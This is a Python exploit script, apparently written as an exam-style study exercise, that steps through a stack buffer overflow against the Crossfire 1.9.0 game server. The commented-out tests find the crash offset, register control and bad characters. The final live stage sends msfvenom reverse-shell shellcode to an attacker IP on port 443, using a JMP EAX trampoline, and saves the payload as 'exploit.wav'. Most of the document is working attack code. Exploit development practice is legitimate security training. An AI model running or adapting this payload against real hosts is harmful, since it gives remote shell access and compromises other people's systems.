a9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp"

# In this case we received the information about the string that crashes the server but should be identified by using spike scripts
try:
    print ("\Preparing the string to crash the server")
    payload = b"\x11(setup sound " + pattern + b"\x90\x00#"
    print("Creating the socket")
    # Create the socket and establish the connection to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Establishing the connection")
    # Both parenthesis are required
    s.connect((host, port)) 
    data = s.recv(1024)
    print("Initial response: ",data)
    print("Sending the payload")
    s.send(payload) 
    s.close() 
except Exception as err:
    print ("Fuzzing crashed: ")
    print (str(err))
    sys.exit() 
'''


#Test 7
print("Test 7 Linux Crossfire 1.9.0 controlling ESP and EAX")

'''
# We know the app crashed with a buffer of 4379, and after analysing the register values when the app crashed we got:
# EIP contains the information in the position 4368 of the injected string when we look for its value using msf-pattern_offset -q [EIPVALUEWHENCRASHED]  In this case: 46367046
# ESP points to the last 7 bytes of the buffer we sent (4373 to 4379)
buffer = b"A"*(4368)
# We know the EAX at the crash moment contained the pointer to the string "setup sound ...." we sent
# To inject the shell and run it, we need the EIP to point to EAX + 12 (Where the buffer we control stards)
# Then we need to inject the opcodes for ADD EAX,12 and JMP EAX in the address pointed by ESP (last 7 bytes of the buffer we sent). In this way we will go to the exact point we want, where the shell code (our buffer) starts 
# We want EIP to point to ESP as we have control of ESP. For now we will left it as BBBB and in the next text we will find out this part
eip =  b"B"*4
# We want to inject these opcodes to the address pointed by ESP (last 7 bytes of our buffer) to gain control of the program:
# Opcode for add eax,12 and JMP EAX: \x83\xc0\x0c\xff\xe0. This part was obtained running msf-nasm_shell and sending the commands we want
#opcode = b"\x83\xc0\x0c\xff\xe0"
opcode = struct.pack('<L', 0xe0ff0cc083)
# As we have 7 bytes in total and we only required 5 for the commands we need, then we can fulfill the other 2 positions with nops
nop = b"\x90"
opcodes_in_esp = opcode + nop + nop

# nops are just like go to the next memmory address.

try:
    print ("\Preparing the string with the reverse shell")
    payload = b"\x11(setup sound " + buffer + eip + opcodes_in_esp + b"\x90\x00#"
    print("Creating the socket")
    # Create the socket and establish the connection to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Establishing the connection")
    # Both parenthesis are required
    s.connect((host, port)) 
    data = s.recv(1024)
    print("Response: ",data)
    print("Sending the payload")
    s.send(payload) 
    s.close() 

except Exception as err:
    print ("Fuzzing crashed: ")
    print (str(err))
    sys.exit() 
'''

#Test 8
print("Test 8 Linux Crossfire 1.9.0 checking badchars")

'''
# Now that we have control of the ESP and AEX, we need to check the badchars. 
# We need to test with all. If there is one that is not showed, it needs to be removed and test again until we can see all the badchars sent in the stack
#  
badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
# This is a key part in this PoC: we need to calculate the remaining buffer we need to fulfill
buffer = badchars + b"A"*(4368-len(badchars))

# We know the EAX at the crash moment contained the pointer to the string "setup sound ...." we sent
# To inject the shell and run it, we need the EIP to point to EAX + 12 (Where the buffer we control stards)
# Then we need to inject the opcodes for ADD EAX,12 and JMP EAX in the address pointed by ESP (last 7 bytes of the buffer we sent). In this way we will go to the exact point we want, where the shell code (our buffer) starts 
# We want EIP to point to ESP as we have control of ESP. For now we will left it as BBBB and in the next text we will find out this part
eip =  b"B"*4
# We want to inject these opcodes to the address pointed by ESP (last 7 bytes of our buffer) to gain control of the program:
# Opcode for add eax,12 and JMP EAX: \x83\xc0\x0c\xff\xe0. This part was obtained running msf-nasm_shell and sending the commands we want
#opcode = b"\x83\xc0\x0c\xff\xe0"
opcode = struct.pack('<L', 0xe0ff0cc083)

# As we have 7 bytes in total and we only required 5 for the commands we need, then we can fulfill the other 2 positions with nops
nop = b"\x90"
opcodes_in_esp = opcode + nop + nop

# nops are just like go to the next memmory address.

try:
    print ("\Preparing the string with the reverse shell")
    payload = b"\x11(setup sound " + buffer + eip + opcodes_in_esp + b"\x90\x00#"
    print("Creating the socket")
    # Create the socket and establish the connection to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Establishing the connection")
    # Both parenthesis are required
    s.connect((host, port)) 
    data = s.recv(1024)
    print("Response: ",data)
    print("Sending the payload")
    s.send(payload) 
    s.close() 

except Exception as err:
    print ("Fuzzing crashed: ")
    print (str(err))
    sys.exit() 
'''

#Test 9
print("Test 9 Linux Crossfire 1.9.0 controlling EIP, ESP and EAX to get reverse shell")


# Now that we need to identify an address where we can find a JMP EAX to get the application runninng what we want (shell). 
# Before running, start the netcat to receive the shellcode: sudo nc -lnvp 443
# To get it we need to use the edb debugger in the linux server and ctrl+o to look for a process with it in the service. In thsi case we got 08134596 
# A breakpoint ot that address in edb could let us stop before exploiting the server to validate all values are as expected
#eip = b"\x96\x45\x13\x08"
eip = struct.pack('<L', 0x08134596)


# We need the shell. It was created by msfvenom. -f is to specify the language format (python) and -v is to define the variable name
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=[KALI_IP] LPORT=443 -b "\x00\x20" -f py -v shellcode
# This was created using IP 192.168.1.99
shellcode = (b"\xda\xcc\xbd\x13\xaf\x32\x43\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
b"\x12\x31\x6a\x17\x83\xea\xfc\x03\x79\xbc\xd0\xb6\x4c\x19\xe3"
b"\xda\xfd\xde\x5f\x77\x03\x68\xbe\x37\x65\xa7\xc1\xab\x30\x87"
b"\xfd\x06\x42\xae\x78\x60\x2a\xf1\xd3\x93\xc9\x99\x21\x94\x0c"
b"\xe1\xaf\x75\xbe\x73\xe0\x24\xed\xc8\x03\x4e\xf0\xe2\x84\x02"
b"\x9a\x92\xab\xd1\x32\x03\x9b\x3a\xa0\xba\x6a\xa7\x76\x6e\xe4"
b"\xc9\xc6\x9b\x3b\x89")
nop = b"\x90"
# Additional nops at the begining to avois issues
nop_sled = nop*8
# This is a key part in this PoC: we need to calculate the remaining buffer we need to fulfill
padding = b"A"*(4368-len(shellcode)-len(nop_sled))
buffer = nop_sled + shellcode + padding 

# We want to inject these opcodes to the address pointed by ESP (last 7 bytes of our buffer) to gain control of the program:
# Opcode for add eax,12 and JMP EAX: \x83\xc0\x0c\xff\xe0. This part was obtained running msf-nasm_shell and sending the commands we want
#opcode = b"\x83\xc0\x0c\xff\xe0"
opcode = struct.pack('<L', 0xe0ff0cc083)

# As we have 7 bytes in total and we only required 5 for the commands we need, then we can fulfill the other 2 positions with nops
opcodes_in_esp = opcode + nop + nop

# nops are just like go to the next memmory address.
try:
    print ("\Preparing the string with the reverse shell")
    payload = b"\x11(setup sound " + buffer + eip + opcodes_in_esp + b"\x90\x00#"
    print("Creating the socket")
    # Create the socket and establish the connection to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Establishing the connection")
    # Both parenthesis are required
    s.connect((host, port)) 
    data = s.recv(1024)
    print("Response: ",data)
    print("Sending the payload")
    s.send(payload) 
    s.close() 
    #Payload can be saved to a file in case it is required:
    with open('exploit.wav', 'wb') as f:
        f.write(payload)

except Exception as err:
    print ("Fuzzing crashed: ")
    print (str(err))
    sys.exit() 

